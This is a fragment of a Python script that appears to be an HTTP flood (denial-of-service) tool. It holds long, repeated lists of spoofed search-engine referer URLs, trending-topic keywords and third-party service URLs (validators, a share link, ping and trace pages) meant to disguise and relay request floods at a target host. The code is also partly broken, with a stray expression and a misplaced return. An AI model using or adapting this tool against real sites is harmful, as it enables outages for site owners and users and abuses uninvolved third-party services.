	headers_referers.append('http://api.duckduckgo.com/html/?q=')
	headers_referers.append('http://boorow.com/Pages/site_br_aspx?query=')
	headers_referers.append('http://api.duckduckgo.com/html/?q=')
	headers_referers.append('http://boorow.com/Pages/site_br_aspx?query=')
	headers_referers.append('http://api.duckduckgo.com/html/?q=')
	headers_referers.append('http://boorow.com/Pages/site_br_aspx?query=')
	headers_referers.append('http://api.duckduckgo.com/html/?q=')
	headers_referers.append('http://boorow.com/Pages/site_br_aspx?query=')
	headers_referers.append('http://api.duckduckgo.com/html/?q=')
	headers_referers.append('http://boorow.com/Pages/site_br_aspx?query=')
	headers_referers.append('http://api.duckduckgo.com/html/?q=')
	headers_referers.append('http://boorow.com/Pages/site_br_aspx?query=')
	headers_referers.append('http://api.duckduckgo.com/html/?q=')
	headers_referers.append('http://boorow.com/Pages/site_br_aspx?query=')
	headers_referers.append('http://api.duckduckgo.com/html/?q=')
	headers_referers.append('http://boorow.com/Pages/site_br_aspx?query=')
	headers_referers.append('http://api.duckduckgo.com/html/?q=')
	headers_referers.append('http://boorow.com/Pages/site_br_aspx?query=')
	headers_referers.append('http://api.duckduckgo.com/html/?q=')
	headers_referers.append('http://boorow.com/Pages/site_br_aspx?query=')
	headers_referers.append('http://www.ask.com/web?q=')
	headers_referers.append('http://search.lycos.com/web/?q=')
	headers_referers.append('http://busca.uol.com.br/web/?q=')
	headers_referers.append('http://us.yhs4.search.yahoo.com/yhs/search?p=')
	headers_referers.append('http://www.dmoz.org/search/search?q=')
	headers_referers.append('http://www.baidu.com.br/s?usm=1&rn=100&wd=')
	headers_referers.append('http://yandex.ru/yandsearch?text=')
	headers_referers.append('http://www.zhongsou.com/third?w=')
	headers_referers.append('http://hksearch.timway.com/search.php?query=')
	headers_referers.append('http://find.ezilon.com/search.php?q=')
	headers_referers.append('http://www.sogou.com/web?query=')
	headers_referers.append('http://api.duckduckgo.com/html/?q=')
	headers_referers.append('http://boorow.com/Pages/site_br_aspx?query=')
	headers_referers.append('http://www.google.com/?q=')
	headers_referers.append('http://api.duckduckgo.com/html/?q=')
	headers_referers.append('http://boorow.com/Pages/site_br_aspx?query=')
	headers_referers.append('http://api.duckduckgo.com/html/?q=')
	headers_referers.append('http://boorow.com/Pages/site_br_aspx?query=')
	headers_referers.append('http://api.duckduckgo.com/html/?q=')
	headers_referers.append('http://boorow.com/Pages/site_br_aspx?query=')
	headers_referers.append('http://api.duckduckgo.com/html/?q=')
	headers_referers.append('http://boorow.com/Pages/site_br_aspx?query=')
	headers_referers.append('http://api.duckduckgo.com/html/?q=')
	headers_referers.append('http://boorow.com/Pages/site_br_aspx?query=')
	headers_referers.append('http://api.duckduckgo.com/html/?q=')
	headers_referers.append('http://boorow.com/Pages/site_br_aspx?query=')
	headers_referers.append('http://api.duckduckgo.com/html/?q=')
	headers_referers.append('http://boorow.com/Pages/site_br_aspx?query=')
	headers_referers.append('http://api.duckduckgo.com/html/?q=')
	headers_referers.append('http://boorow.com/Pages/site_br_aspx?query=')
	headers_referers.append('http://api.duckduckgo.com/html/?q=')
	headers_referers.append('http://boorow.com/Pages/site_br_aspx?query=')
	headers_referers.append('http://api.duckduckgo.com/html/?q=')
	headers_referers.append('http://boorow.com/Pages/site_br_aspx?query=')
	headers_referers.append('http://api.duckduckgo.com/html/?q=')
	headers_referers.append('http://boorow.com/Pages/site_br_aspx?query=')
	headers_referers.append('http://api.duckduckgo.com/html/?q=')
	headers_referers.append('http://boorow.com/Pages/site_br_aspx?query=')
	headers_referers.append('http://api.duckduckgo.com/html/?q=')
	headers_referers.append('http://boorow.com/Pages/site_br_aspx?query=')
	headers_referers.append('http://www.ask.com/web?q=')
	headers_referers.append('http://search.lycos.com/web/?q=')
	headers_referers.append('http://busca.uol.com.br/web/?q=')
	headers_referers.append('http://us.yhs4.search.yahoo.com/yhs/search?p=')
	headers_referers.append('http://www.dmoz.org/search/search?q=')
	headers_referers.append('http://www.baidu.com.br/s?usm=1&rn=100&wd=')
	headers_referers.append('http://yandex.ru/yandsearch?text=')
	headers_referers.append('http://www.zhongsou.com/third?w=')
	headers_referers.append('http://hksearch.timway.com/search.php?query=')
	headers_referers.append('http://find.ezilon.com/search.php?q=')
	headers_referers.append('http://www.sogou.com/web?query=')
	headers_referers.append('http://api.duckduckgo.com/html/?q=')
	headers_referers.append('http://boorow.com/Pages/site_br_aspx?query=')
	headers_referers.append('http://www.google.com/?q=')
	headers_referers.append('http://api.duckduckgo.com/html/?q=')
	headers_referers.append('http://boorow.com/Pages/site_br_aspx?query=')
	headers_referers.append('http://api.duckduckgo.com/html/?q=')
	headers_referers.append('http://boorow.com/Pages/site_br_aspx?query=')
	headers_referers.append('http://api.duckduckgo.com/html/?q=')
	headers_referers.append('http://boorow.com/Pages/site_br_aspx?query=')
	headers_referers.append('http://api.duckduckgo.com/html/?q=')
	headers_referers.append('http://boorow.com/Pages/site_br_aspx?query=')
	headers_referers.append('http://api.duckduckgo.com/html/?q=')
	headers_referers.append('http://boorow.com/Pages/site_br_aspx?query=')
	headers_referers.append('http://api.duckduckgo.com/html/?q=')
	headers_referers.append('http://boorow.com/Pages/site_br_aspx?query=')
	headers_referers.append('http://api.duckduckgo.com/html/?q=')
	headers_referers.append('http://boorow.com/Pages/site_br_aspx?query=')
	headers_referers.append('http://api.duckduckgo.com/html/?q=')
	headers_referers.append('http://boorow.com/Pages/site_br_aspx?query=')
	headers_referers.append('http://api.duckduckgo.com/html/?q=')
	headers_referers.append('http://boorow.com/Pages/site_br_aspx?query=')
	headers_referers.append('http://api.duckduckgo.com/html/?q=')
	headers_referers.append('http://boorow.com/Pages/site_br_aspx?query=')
	headers_referers.append('http://api.duckduckgo.com/html/?q=')
	headers_referers.append('http://boorow.com/Pages/site_br_aspx?query=')
	headers_referers.append('http://api.duckduckgo.com/html/?q=')
	headers_referers.append('http://boorow.com/Pages/site_br_aspx?query=')
	headers_referers.append('http://api.duckduckgo.com/html/?q=')
	headers_referers.append('http://boorow.com/Pages/site_br_aspx?query=')
	headers_referers.append('http://www.ask.com/web?q=')
	headers_referers.append('http://search.lycos.com/web/?q=')
	headers_referers.append('http://busca.uol.com.br/web/?q=')
	headers_referers.append('http://us.yhs4.search.yahoo.com/yhs/search?p=')
	headers_referers.append('http://www.dmoz.org/search/search?q=')
	headers_referers.append('http://www.baidu.com.br/s?usm=1&rn=100&wd=')
	headers_referers.append('http://yandex.ru/yandsearch?text=')
	headers_referers.append('http://www.zhongsou.com/third?w=')
	headers_referers.append('http://hksearch.timway.com/search.php?query=')
	headers_referers.append('http://find.ezilon.com/search.php?q=')
	headers_referers.append('http://www.sogou.com/web?query=')
	headers_referers.append('http://api.duckduckgo.com/html/?q=')
	headers_referers.append('http://boorow.com/Pages/site_br_aspx?query=')
	headers_referers.append('http://www.google.com/?q=')
	headers_referers.append('http://api.duckduckgo.com/html/?q=')
	headers_referers.append('http://boorow.com/Pages/site_br_aspx?query=')
	headers_referers.append('http://api.duckduckgo.com/html/?q=')
	headers_referers.append('http://boorow.com/Pages/site_br_aspx?query=')
	headers_referers.append('http://api.duckduckgo.com/html/?q=')
	headers_referers.append('http://boorow.com/Pages/site_br_aspx?query=')
	headers_referers.append('http://api.duckduckgo.com/html/?q=')
	headers_referers.append('http://boorow.com/Pages/site_br_aspx?query=')
	headers_referers.append('http://api.duckduckgo.com/html/?q=')
	headers_referers.append('http://boorow.com/Pages/site_br_aspx?query=')
	headers_referers.append('http://api.duckduckgo.com/html/?q=')
	headers_referers.append('http://boorow.com/Pages/site_br_aspx?query=')
	headers_referers.append('http://api.duckduckgo.com/html/?q=')
	headers_referers.append('http://boorow.com/Pages/site_br_aspx?query=')
	headers_referers.append('http://api.duckduckgo.com/html/?q=')
	headers_referers.append('http://boorow.com/Pages/site_br_aspx?query=')
	headers_referers.append('http://api.duckduckgo.com/html/?q=')
	headers_referers.append('http://boorow.com/Pages/site_br_aspx?query=')
	headers_referers.append('http://api.duckduckgo.com/html/?q=')
	headers_referers.append('http://boorow.com/Pages/site_br_aspx?query=')
	headers_referers.append('http://api.duckduckgo.com/html/?q=')
	headers_referers.append('http://boorow.com/Pages/site_br_aspx?query=')
	headers_referers.append('http://api.duckduckgo.com/html/?q=')
	headers_referers.append('http://boorow.com/Pages/site_br_aspx?query=')
	headers_referers.append('http://api.duckduckgo.com/html/?q=')
	headers_referers.append('http://boorow.com/Pages/site_br_aspx?query=')
	headers_referers.append('http://www.ask.com/web?q=')
	headers_referers.append('http://search.lycos.com/web/?q=')
	headers_referers.append('http://busca.uol.com.br/web/?q=')
	headers_referers.append('http://us.yhs4.search.yahoo.com/yhs/search?p=')
	headers_referers.append('http://www.dmoz.org/search/search?q=')
	headers_referers.append('http://www.baidu.com.br/s?usm=1&rn=100&wd=')
	headers_referers.append('http://yandex.ru/yandsearch?text=')
	headers_referers.append('http://www.zhongsou.com/third?w=')
	headers_referers.append('http://hksearch.timway.com/search.php?query=')
	headers_referers.append('http://find.ezilon.com/search.php?q=')
	headers_referers.append('http://www.sogou.com/web?query=')
	headers_referers.append('http://api.duckduckgo.com/html/?q=')
	headers_referers.append('http://boorow.com/Pages/site_br_aspx?query=')
	headers_referers.append('http://www.google.com/?q=')
	headers_referers.append('http://api.duckduckgo.com/html/?q=')
	headers_referers.append('http://boorow.com/Pages/site_br_aspx?query=')
	headers_referers.append('http://api.duckduckgo.com/html/?q=')
	headers_referers.append('http://boorow.com/Pages/site_br_aspx?query=')
	headers_referers.append('http://api.duckduckgo.com/html/?q=')
	headers_referers.append('http://boorow.com/Pages/site_br_aspx?query=')
	headers_referers.append('http://api.duckduckgo.com/html/?q=')
	headers_referers.append('http://boorow.com/Pages/site_br_aspx?query=')
	headers_referers.append('http://api.duckduckgo.com/html/?q=')
	headers_referers.append('http://boorow.com/Pages/site_br_aspx?query=')
	headers_referers.append('http://api.duckduckgo.com/html/?q=')
	headers_referers.append('http://boorow.com/Pages/site_br_aspx?query=')
	headers_referers.append('http://api.duckduckgo.com/html/?q=')
	headers_referers.append('http://boorow.com/Pages/site_br_aspx?query=')
	headers_referers.append('http://api.duckduckgo.com/html/?q=')
	headers_referers.append('http://boorow.com/Pages/site_br_aspx?query=')
	headers_referers.append('http://api.duckduckgo.com/html/?q=')
	headers_referers.append('http://boorow.com/Pages/site_br_aspx?query=')
	headers_referers.append('http://api.duckduckgo.com/html/?q=')
	headers_referers.append('http://boorow.com/Pages/site_br_aspx?query=')
	headers_referers.append('http://api.duckduckgo.com/html/?q=')
	headers_referers.append('http://boorow.com/Pages/site_br_aspx?query=')
	headers_referers.append('http://api.duckduckgo.com/html/?q=')
	headers_referers.append('http://boorow.com/Pages/site_br_aspx?query=')
	headers_referers.append('http://api.duckduckgo.com/html/?q=')
	headers_referers.append('http://boorow.com/Pages/site_br_aspx?query=')
	headers_referers.append('http://www.ask.com/web?q=')
	headers_referers.append('http://search.lycos.com/web/?q=')
	headers_referers.append('http://busca.uol.com.br/web/?q=')
	headers_referers.append('http://us.yhs4.search.yahoo.com/yhs/search?p=')
	headers_referers.append('http://www.dmoz.org/search/search?q=')
	headers_referers.append('http://www.baidu.com.br/s?usm=1&rn=100&wd=')
	headers_referers.append('http://yandex.ru/yandsearch?text=')
	headers_referers.append('http://www.zhongsou.com/third?w=')
	headers_referers.append('http://hksearch.timway.com/search.php?query=')
	headers_referers.append('http://find.ezilon.com/search.php?q=')
	headers_referers.append('http://www.sogou.com/web?query=')
	headers_referers.append('http://api.duckduckgo.com/html/?q=')
	headers_referers.append('http://boorow.com/Pages/site_br_aspx?query=')
	headers_referers.append('http://www.google.com/?q=')
	headers_referers.append('http://api.duckduckgo.com/html/?q=')
	headers_referers.append('http://boorow.com/Pages/site_br_aspx?query=')
	headers_referers.append('http://api.duckduckgo.com/html/?q=')
	headers_referers.append('http://boorow.com/Pages/site_br_aspx?query=')
	headers_referers.append('http://api.duckduckgo.com/html/?q=')
	headers_referers.append('http://boorow.com/Pages/site_br_aspx?query=')
	headers_referers.append('http://api.duckduckgo.com/html/?q=')
	headers_referers.append('http://boorow.com/Pages/site_br_aspx?query=')
	headers_referers.append('http://api.duckduckgo.com/html/?q=')
	headers_referers.append('http://boorow.com/Pages/site_br_aspx?query=')
	headers_referers.append('http://api.duckduckgo.com/html/?q=')
	headers_referers.append('http://boorow.com/Pages/site_br_aspx?query=')
	headers_referers.append('http://api.duckduckgo.com/html/?q=')
	headers_referers.append('http://boorow.com/Pages/site_br_aspx?query=')
	headers_referers.append('http://api.duckduckgo.com/html/?q=')
	headers_referers.append('http://boorow.com/Pages/site_br_aspx?query=')
	headers_referers.append('http://api.duckduckgo.com/html/?q=')
	headers_referers.append('http://boorow.com/Pages/site_br_aspx?query=')
	headers_referers.append('http://api.duckduckgo.com/html/?q=')
	headers_referers.append('http://boorow.com/Pages/site_br_aspx?query=')
	headers_referers.append('http://api.duckduckgo.com/html/?q=')
	headers_referers.append('http://boorow.com/Pages/site_br_aspx?query=')
	headers_referers.append('http://api.duckduckgo.com/html/?q=')
	headers_referers.append('http://boorow.com/Pages/site_br_aspx?query=')
	headers_referers.append('http://api.duckduckgo.com/html/?q=')
	headers_referers.append('http://boorow.com/Pages/site_br_aspx?query=')

	return(headers_referers)

# generates a Keyword list	
def keyword_list():
        global keyword_top
        keyword_top.append('HaxStroke')
        keyword_top.append('Ecosistema')
        keyword_top.append('Suicide')
        keyword_top.append('Sex')
        keyword_top.append('Robin Williams')
        keyword_top.append('World Cup')
        keyword_top.append('Ca Si Le Roi')
        keyword_top.append('Ebola')
        keyword_top.append('Malaysia Airlines Flight 370')
        keyword_top.append('ALS Ice Bucket Challenge')
        keyword_top.append('Flappy Bird')
        keyword_top.append('Conchita Wurst')
        keyword_top.append('ISIS')
        keyword_top.append('Frozen')
        keyword_top.append('014 Sochi Winter Olympics')
        keyword_top.append('IPhone')
        keyword_top.append('Samsung Galaxy S5')
        keyword_top.append('Nexus 6')
        keyword_top.append('Moto G')
        keyword_top.append('Samsung Note 4')
        keyword_top.append('LG G3')
        keyword_top.append('Xbox One')
        keyword_top.append('Apple Watch')
        keyword_top.append('Nokia X')
        keyword_top.append('Ipad Air')
        keyword_top.append('Facebook')
        keyword_top.append('Anonymous')
        keyword_top.append('DJ Bach')
        keyword_top.append('Ecosistema')
        keyword_top.append('Suicide')
        keyword_top.append('Sex')
        keyword_top.append('Robin Williams')
        keyword_top.append('World Cup')
        keyword_top.append('Ca Si Le Roi')
        keyword_top.append('Ebola')
        keyword_top.append('Malaysia Airlines Flight 370')
        keyword_top.append('ALS Ice Bucket Challenge')
        keyword_top.append('Flappy Bird')
        keyword_top.append('Conchita Wurst')
        keyword_top.append('ISIS')
        keyword_top.append('Frozen')
        keyword_top.append('014 Sochi Winter Olympics')
        keyword_top.append('IPhone')
        keyword_top.append('Samsung Galaxy S5')
        keyword_top.append('Nexus 6')
        keyword_top.append('Moto G')
        keyword_top.append('Samsung Note 4')
        keyword_top.append('LG G3')
        keyword_top.append('Xbox One')
        keyword_top.append('Apple Watch')
        keyword_top.append('Nokia X')
        keyword_top.append('Ipad Air')
        keyword_top.append('Facebook')
        keyword_top.append('Anonymous')
        keyword_top.append('DJ Bach')
        keyword_top.append('Ecosistema')
        keyword_top.append('Suicide')
        keyword_top.append('Sex')
        keyword_top.append('Robin Williams')
        keyword_top.append('World Cup')
        keyword_top.append('Ca Si Le Roi')
        keyword_top.append('Ebola')
        keyword_top.append('Malaysia Airlines Flight 370')
        keyword_top.append('ALS Ice Bucket Challenge')
        keyword_top.append('Flappy Bird')
        keyword_top.append('Conchita Wurst')
        keyword_top.append('ISIS')
        keyword_top.append('Frozen')
        keyword_top.append('014 Sochi Winter Olympics')
        keyword_top.append('IPhone')
        keyword_top.append('Samsung Galaxy S5')
        keyword_top.append('Nexus 6')
        keyword_top.append('Moto G')
        keyword_top.append('Samsung Note 4')
        keyword_top.append('LG G3')
        keyword_top.append('Xbox One')
        keyword_top.append('Apple Watch')
        keyword_top.append('Nokia X')
        keyword_top.append('Ipad Air')
        keyword_top.append('Facebook')
        keyword_top.append('Anonymous')
        keyword_top.append('DJ Bach')
        keyword_top.append('Ecosistema')
        keyword_top.append('Suicide')
        keyword_top.append('Sex')
        keyword_top.append('Robin Williams')
        keyword_top.append('World Cup')
        keyword_top.append('Ca Si Le Roi')
        keyword_top.append('Ebola')
        keyword_top.append('Malaysia Airlines Flight 370')
        keyword_top.append('ALS Ice Bucket Challenge')
        keyword_top.append('Flappy Bird')
        keyword_top.append('Conchita Wurst')
        keyword_top.append('ISIS')
        keyword_top.append('Frozen')
        keyword_top.append('014 Sochi Winter Olympics')
        keyword_top.append('IPhone')
        keyword_top.append('Samsung Galaxy S5')
        keyword_top.append('Nexus 6')
        keyword_top.append('Moto G')
        keyword_top.append('Samsung Note 4')
        keyword_top.append('LG G3')
        keyword_top.append('Xbox One')
        keyword_top.append('Apple Watch')
        keyword_top.append('Nokia X')
        keyword_top.append('Ipad Air')
        keyword_top.append('Facebook')
        keyword_top.append('Anonymous')
        keyword_top.append('DJ Bach')
        keyword_top.append('Ecosistema')
        keyword_top.append('Suicide')
        keyword_top.append('Sex')
        keyword_top.append('Robin Williams')
        keyword_top.append('World Cup')
        keyword_top.append('Ca Si Le Roi')
        keyword_top.append('Ebola')
        keyword_top.append('Malaysia Airlines Flight 370')
        keyword_top.append('ALS Ice Bucket Challenge')
        keyword_top.append('Flappy Bird')
        keyword_top.append('Conchita Wurst')
        keyword_top.append('ISIS')
        keyword_top.append('Frozen')
        keyword_top.append('014 Sochi Winter Olympics')
        keyword_top.append('IPhone')
        keyword_top.append('Samsung Galaxy S5')
        keyword_top.append('Nexus 6')
        keyword_top.append('Moto G')
        keyword_top.append('Samsung Note 4')
        keyword_top.append('LG G3')
        keyword_top.append('Xbox One')
        keyword_top.append('Apple Watch')
        keyword_top.append('Nokia X')
        keyword_top.append('Ipad Air')
        keyword_top.append('Facebook')
        keyword_top.append('Anonymous')
        keyword_top.append('DJ Bach')
        keyword_top.append('Ecosistema')
        keyword_top.append('Suicide')
        keyword_top.append('Sex')
        keyword_top.append('Robin Williams')
        keyword_top.append('World Cup')
        keyword_top.append('Ca Si Le Roi')
        keyword_top.append('Ebola')
        keyword_top.append('Malaysia Airlines Flight 370')
        keyword_top.append('ALS Ice Bucket Challenge')
        keyword_top.append('Flappy Bird')
        keyword_top.append('Conchita Wurst')
        keyword_top.append('ISIS')
        keyword_top.append('Frozen')
        keyword_top.append('014 Sochi Winter Olympics')
        keyword_top.append('IPhone')
        keyword_top.append('Samsung Galaxy S5')
        keyword_top.append('Nexus 6')
        keyword_top.append('Moto G')
        keyword_top.append('Samsung Note 4')
        keyword_top.append('LG G3')
        keyword_top.append('Xbox One')
        keyword_top.append('Apple Watch')
        keyword_top.append('Nokia X')
        keyword_top.append('Ipad Air')
        keyword_top.append('Facebook')
        keyword_top.append('Anonymous')
        keyword_top.append('DJ Bach')
        keyword_top.append('adidas')
        keyword_top.append('ask.fm')
        keyword_top.append('adele')
        keyword_top.append('5x nexus')
        keyword_top.append('espn')
        keyword_top.append('uggs')
        keyword_top.append('uber')
        keyword_top.append('american eagle')
        keyword_top.append('jessica simpson')
        keyword_top.append('jacket')
        keyword_top.append('anderson east')
        keyword_top.append('kroger')
                           
        ('http://' + host + '/')
	return(headers_referers)
def bots():
	global bots
	bots=[]
	bots.append("http://validator.w3.org/check?uri=")
	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
	bots.append("http://downforeveryoneorjustme.com/")
	bots.append("http://network-tools.com/default.asp?prog=ping&host=")
	bots.append("http://network-tools.com/default.asp?prog=trace&host=")
	bots.append("http://network-tools.com/default.asp?prog=network&host=")
	bots.append("http://validator.w3.org/check?uri=")
	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
	bots.append("http://downforeveryoneorjustme.com/")
	bots.append("http://network-tools.com/default.asp?prog=ping&host=")
	bots.append("http://network-tools.com/default.asp?prog=trace&host=")
	bots.append("http://network-tools.com/default.asp?prog=network&host=")
	bots.append("http://validator.w3.org/check?uri=")
	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
	bots.append("http://downforeveryoneorjustme.com/")
	bots.append("http://network-tools.com/default.asp?prog=ping&host=")
	bots.append("http://network-tools.com/default.asp?prog=trace&host=")
	bots.append("http://network-tools.com/default.asp?prog=network&host=")
	bots.append("http://validator.w3.org/check?uri=")
	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
	bots.append("http://downforeveryoneorjustme.com/")
	bots.append("http://network-tools.com/default.asp?prog=ping&host=")
	bots.append("http://network-tools.com/default.asp?prog=trace&host=")
	bots.append("http://network-tools.com/default.asp?prog=network&host=")
	bots.append("http://validator.w3.org/check?uri=")
	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
	bots.append("http://downforeveryoneorjustme.com/")
	bots.append("http://network-tools.com/default.asp?prog=ping&host=")
	bots.append("http://network-tools.com/default.asp?prog=trace&host=")
	bots.append("http://network-tools.com/default.asp?prog=network&host=")
	bots.append("http://validator.w3.org/check?uri=")
	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
	bots.append("http://downforeveryoneorjustme.com/")
	bots.append("http://network-tools.com/default.asp?prog=ping&host=")
	bots.append("http://network-tools.com/default.asp?prog=trace&host=")
	bots.append("http://network-tools.com/default.asp?prog=network&host=")
	bots.append("http://validator.w3.org/check?uri=")
	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
	bots.append("http://downforeveryoneorjustme.com/")
	bots.append("http://network-tools.com/default.asp?prog=ping&host=")
	bots.append("http://network-tools.com/default.asp?prog=trace&host=")
	bots.append("http://network-tools.com/default.asp?prog=network&host=")
	bots.append("http://validator.w3.org/check?uri=")
	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
	bots.append("http://downforeveryoneorjustme.com/")
	bots.append("http://network-tools.com/default.asp?prog=ping&host=")
	bots.append("http://network-tools.com/default.asp?prog=trace&host=")
	bots.append("http://network-tools.com/default.asp?prog=network&host=")
	bots.append("http://validator.w3.org/check?uri=")
	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
	bots.append("http://downforeveryoneorjustme.com/")
	bots.append("http://network-tools.com/default.asp?prog=ping&host=")
	bots.append("http://network-tools.com/default.asp?prog=trace&host=")
	bots.append("http://network-tools.com/default.asp?prog=network&host=")
	bots.append("http://validator.w3.org/check?uri=")
	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
	bots.append("http://downforeveryoneorjustme.com/")
	bots.append("http://network-tools.com/default.asp?prog=ping&host=")
	bots.append("http://network-tools.com/default.asp?prog=trace&host=")
	bots.append("http://network-tools.com/default.asp?prog=network&host=")
	bots.append("http://validator.w3.org/check?uri=")
	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
	bots.append("http://downforeveryoneorjustme.com/")
	bots.append("http://network-tools.com/default.asp?prog=ping&host=")
	bots.append("http://network-tools.com/default.asp?prog=trace&host=")
	bots.append("http://network-tools.com/default.asp?prog=network&host=")
	bots.append("http://validator.w3.org/check?uri=")
	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
	bots.append("http://downforeveryoneorjustme.com/")
	bots.append("http://network-tools.com/default.asp?prog=ping&host=")
	bots.append("http://network-tools.com/default.asp?prog=trace&host=")
	bots.append("http://network-tools.com/default.asp?prog=network&host=")
	bots.append("http://validator.w3.org/check?uri=")
	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
	bots.append("http://downforeveryoneorjustme.com/")
	bots.append("http://network-tools.com/default.asp?prog=ping&host=")
	bots.append("http://network-tools.com/default.asp?prog=trace&host=")
	bots.append("http://network-tools.com/default.asp?prog=network&host=")
	bots.append("http://validator.w3.org/check?uri=")
	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
	bots.append("http://downforeveryoneorjustme.com/")
	bots.append("http://network-tools.com/default.asp?prog=ping&host=")
	bots.append("http://network-tools.com/default.asp?prog=trace&host=")
	bots.append("http://network-tools.com/default.asp?prog=network&host=")
	bots.append("http://validator.w3.org/check?uri=")
	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
	bots.append("http://downforeveryoneorjustme.com/")
	bots.append("http://network-tools.com/default.asp?prog=ping&host=")
	bots.append("http://network-tools.com/default.asp?prog=trace&host=")
	bots.append("http://network-tools.com/default.asp?prog=network&host=")
	bots.append("http://validator.w3.org/check?uri=")
	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
	bots.append("http://downforeveryoneorjustme.com/")
	bots.append("http://network-tools.com/default.asp?prog=ping&host=")
	bots.append("http://network-tools.com/default.asp?prog=trace&host=")
	bots.append("http://network-tools.com/default.asp?prog=network&host=")
	bots.append("http://validator.w3.org/check?uri=")
	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
	bots.append("http://downforeveryoneorjustme.com/")
	bots.append("http://network-tools.com/default.asp?prog=ping&host=")
	bots.append("http://network-tools.com/default.asp?prog=trace&host=")
	bots.append("http://network-tools.com/default.asp?prog=network&host=")
	bots.append("http://validator.w3.org/check?uri=")
	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
	bots.append("http://downforeveryoneorjustme.com/")
	bots.append("http://network-tools.com/default.asp?prog=ping&host=")
	bots.append("http://network-tools.com/default.asp?prog=trace&host=")
	bots.append("http://network-tools.com/default.asp?prog=network&host=")
	bots.append("http://validator.w3.org/check?uri=")
	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
	bots.append("http://downforeveryoneorjustme.com/")
	bots.append("http://network-tools.com/default.asp?prog=ping&host=")
	bots.append("http://network-tools.com/default.asp?prog=trace&host=")
	bots.append("http://network-tools.com/default.asp?prog=network&host=")
	bots.append("http://validator.w3.org/check?uri=")
	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
	bots.append("http://downforeveryoneorjustme.com/")
	bots.append("http://network-tools.com/default.asp?prog=ping&host=")
	bots.append("http://network-tools.com/default.asp?prog=trace&host=")
	bots.append("http://network-tools.com/default.asp?prog=network&host=")
	bots.append("http://validator.w3.org/check?uri=")
	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
	bots.append("http://downforeveryoneorjustme.com/")
	bots.append("http://network-tools.com/default.asp?prog=ping&host=")
	bots.append("http://network-tools.com/default.asp?prog=trace&host=")
	bots.append("http://network-tools.com/default.asp?prog=network&host=")
	bots.append("http://validator.w3.org/check?uri=")
	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
	bots.append("http://downforeveryoneorjustme.com/")
	bots.append("http://network-tools.com/default.asp?prog=ping&host=")
	bots.append("http://network-tools.com/default.asp?prog=trace&host=")
	bots.append("http://network-tools.com/default.asp?prog=network&host=")
	bots.append("http://validator.w3.org/check?uri=")
	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
	bots.append("http://downforeveryoneorjustme.com/")
	bots.append("http://network-tools.com/default.asp?prog=ping&host=")
	bots.append("http://network-tools.com/default.asp?prog=trace&host=")
	bots.append("http://network-tools.com/default.asp?prog=network&host=")
	bots.append("http://validator.w3.org/check?uri=")
	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
	bots.append("http://downforeveryoneorjustme.com/")
	bots.append("http://network-tools.com/default.asp?prog=ping&host=")
	bots.append("http://network-tools.com/default.asp?prog=trace&host=")
	bots.append("http://network-tools.com/default.asp?prog=network&host=")
	bots.append("http://validator.w3.org/check?uri=")
	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
	bots.append("http://downforeveryoneorjustme.com/")
	bots.append("http://network-tools.com/default.asp?prog=ping&host=")
	bots.append("http://network-tools.com/default.asp?prog=trace&host=")
	bots.append("http://network-tools.com/default.asp?prog=network&host=")
	bots.append("http://validator.w3.org/check?uri=")
	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
	bots.append("http://downforeveryoneorjustme.com/")
	bots.append("http://network-tools.com/default.asp?prog=ping&host=")
	bots.append("http://network-tools.com/default.asp?prog=trace&host=")
	bots.append("http://network-tools.com/default.asp?prog=network&host=")
	bots.append("http://validator.w3.org/check?uri=")
	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
	bots.append("http://downforeveryoneorjustme.com/")
	bots.append("http://network-tools.com/default.asp?prog=ping&host=")
	bots.append("http://network-tools.com/default.asp?prog=trace&host=")
	bots.append("http://network-tools.com/default.asp?prog=network&host=")
	bots.append("http://validator.w3.org/check?uri=")
	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
	bots.append("http://downforeveryoneorjustme.com/")
	bots.append("http://network-tools.com/default.asp?prog=ping&host=")
	bots.append("http://network-tools.com/default.asp?prog=trace&host=")
	bots.append("http://network-tools.com/default.asp?prog=network&host=")
	bots.append("http://validator.w3.org/check?uri=")
	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
	bots.append("http://downforeveryoneorjustme.com/")
	bots.append("http://network-tools.com/default.asp?prog=ping&host=")
	bots.append("http://network-tools.com/default.asp?prog=trace&host=")
	bots.append("http://network-tools.com/default.asp?prog=network&host=")
	bots.append("http://validator.w3.org/check?uri=")
	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
	bots.append("http://downforeveryoneorjustme.com/")
	bots.append("http://network-tools.com/default.asp?prog=ping&host=")
	bots.append("http://network-tools.com/default.asp?prog=trace&host=")
	bots.append("http://network-tools.com/default.asp?prog=network&host=")
	bots.append("http://validator.w3.org/check?uri=")
	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
	bots.append("http://downforeveryoneorjustme.com/")
	bots.append("http://network-tools.com/default.asp?prog=ping&host=")
	bots.append("http://network-tools.com/default.asp?prog=trace&host=")
	bots.append("http://network-tools.com/default.asp?prog=network&host=")
	bots.append("http://validator.w3.org/check?uri=")
	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
	bots.append("http://downforeveryoneorjustme.com/")
